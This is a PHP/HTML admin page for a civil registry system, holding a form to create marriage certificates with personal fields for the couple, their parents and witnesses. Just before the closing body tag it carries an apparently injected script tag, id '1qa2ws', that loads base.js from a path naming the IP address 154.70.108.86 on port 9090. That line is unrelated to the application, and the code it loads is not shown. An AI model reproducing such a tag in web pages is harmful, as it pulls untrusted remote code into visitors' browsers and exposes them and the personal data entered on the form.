<!DOCTYPE html>
<html lang="en">
<!-- BEGIN HEAD -->



<head>
	
	<title>Civil Registry</title>
	<!-- google font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- dropzone -->
	<link href="../assets/plugins/dropzone/dropzone.css" rel="stylesheet" media="screen">
	<!-- Date Time item CSS -->
	<link rel="stylesheet" href="../assets/plugins/material-datetimepicker/bootstrap-material-datetimepicker.css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />
</head>
<!-- END HEAD -->

<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-dark dark-sidebar-color logo-dark dark-theme">
	<div class="page-wrapper">
		<?php require 'nav.php'; ?>
		
		<!-- start page container -->
		<div class="page-container">
			
			<!-- start page content -->
			<div class="page-content-wrapper">
				<div class="page-content">
					<div class="page-bar">
						<div class="page-title-breadcrumb">
							<div class=" pull-left">
								<div class="page-title">Create Marriage Certificate</div>
							</div>
							<ol class="breadcrumb page-breadcrumb pull-right">
								<li><i class="fa fa-home"></i>&nbsp;<a class="parent-item" href="index.php">Home</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li><a class="parent-item" href="#">Marriage</a>&nbsp;<i class="fa fa-angle-right"></i>
								</li>
								<li class="active">Create marriage Certificate</li>
							</ol>
						</div>
					</div>
					<div class="row">
						<div class="col-sm-12">
							<div class="card-box">
								<div class="card-head">
									<header>Basic Information</header>
									
								</div>
								<form action="add_marriage.inc.php" method="post">
								<div class="card-body row">
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtFirstName" name = "gname" required>
											<label class="mdl-textfield__label">Bridegroom Name</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name = "gage" required>
											<label class="mdl-textfield__label">Aged</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gfname" >
											<label class="mdl-textfield__label">Son Of</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gmname" required>
											<label class="mdl-textfield__label">And of</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gocc" required>
											<label class="mdl-textfield__label">Occupation</label>
										</div>
									</div>
									 <div class="col-lg-2 p-t-20"><label >Born on</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="gdob" required>
		                                  
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gpob" required>
											<label class="mdl-textfield__label">Born At</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gress" required>
											<label class="mdl-textfield__label">Resident At</label>
										</div>
									</div>
									
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtParentName" name="bname" required>
											<label class="mdl-textfield__label">Bride Name</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bage" required>
											<label class="mdl-textfield__label">Aged</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bfname">
											<label class="mdl-textfield__label">Daughter Of</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width" >
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bmname" required>
											<label class="mdl-textfield__label">And Of</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bocc" required>
											<label class="mdl-textfield__label">Occupation</label>
										</div>
									</div>
									 <div class="col-lg-2 p-t-20"><label >Born on</label></div>
									<div class="col-lg-4 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="date"  id="dateofBirth" name="bdob" required>
		                                  
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bpob" required>
											<label class="mdl-textfield__label">Born At</label>
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bress" required>
											<label class="mdl-textfield__label">Resident At</label>
										</div>
									</div>
									
									<div class="col-lg-6 p-t-20">
									    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label getmdl-select getmdl-select__fix-height txt-full-width">
											<input class="mdl-textfield__input" type="text" id="sample2" value="" readonly tabIndex="-1" name="martype" required>
											<label for="sample2" class="pull-right margin-0">
												<i class="mdl-icon-toggle__label material-icons">keyboard_arrow_down</i>
											</label>
											<label for="sample2" class="mdl-textfield__label">Marriage Type</label>
											<ul data-mdl-for="sample2" class="mdl-menu mdl-menu--bottom-left mdl-js-menu">
												<li class="mdl-menu__item" data-val="DE">Monogamy</li>
												<li class="mdl-menu__item" data-val="BY">polygamy</li>
											</ul>
										</div>
								
									</div>
									<div class="col-lg-6 p-t-20">
									    <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label getmdl-select getmdl-select__fix-height txt-full-width">
											<input class="mdl-textfield__input" type="text" id="sample2" value="" readonly tabIndex="-1" name="proptype" required>
											<label for="sample2" class="pull-right margin-0">
												<i class="mdl-icon-toggle__label material-icons">keyboard_arrow_down</i>
											</label>
											<label for="sample2" class="mdl-textfield__label">Property Type</label>
											<ul data-mdl-for="sample2" class="mdl-menu mdl-menu--bottom-left mdl-js-menu">
												<li class="mdl-menu__item" data-val="DE">Joint Property</li>
												<li class="mdl-menu__item" data-val="BY">Seperate Property</li>
											</ul>
										</div>
								
									</div>
									<div class="col-lg-6 p-t-20">
									
									<div class="col-lg-6 p-t-20">
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gwit1" required>
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="gwit2" required>
											<label class="mdl-textfield__label">Witnesses</label>
									
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bwit1" required>
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="bwit2" required>
											
										</div>
									</div>
									<div class="col-lg-6 p-t-20">
										<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
											<input class="mdl-textfield__input" type="text" id="txtLasttName" name="pubid" required>
											<label class="mdl-textfield__label">Publication No.</label>
										</div>
									</div>
									<div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label txt-full-width">
										<input class="mdl-textfield__input" type="text" id="txtLasttName" name="regname" required>
											<label class="mdl-textfield__label">Civil Registrar Name</label>
										</div>
									</div>
									
									<div class="col-lg-12 p-t-20">
										<label class="control-label col-md-3">Upload Photo
										</label>
										<div class="col-md-12">
											<div id="id_dropzone" class="dropzone"></div>
										</div>

									</div>
									
									<div class="col-lg-12 p-t-20 text-center">
										<button type="Submit" name="create" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 m-r-20 btn-pink">Submit</button>
										
										<script type ="text/javascript">

			                                    function redirect(){
				                                window.location="all_marriages.php";
			}
			
		                                </script>
										<button type="button" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect m-b-10 btn-default" onclick="redirect()">Cancel</button>
									</div>
								</div>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- end page content -->
			
		</div>
		<!-- end page container -->
		<!-- start footer -->
		<?php require 'footer.php'?>
		<!-- end footer -->
	</div>
	<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<script src="../assets/js/pages/material-select/getmdl-select.js"></script>
	<script src="../assets/plugins/material-datetimepicker/moment-with-locales.min.js"></script>
	<script src="../assets/plugins/material-datetimepicker/bootstrap-material-datetimepicker.js"></script>
	<script src="../assets/plugins/material-datetimepicker/datetimepicker.js"></script>
	<!-- dropzone -->
	<script src="../assets/plugins/dropzone/dropzone.js"></script>
	<script src="../assets/plugins/dropzone/dropzone-call.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script></body>



</html>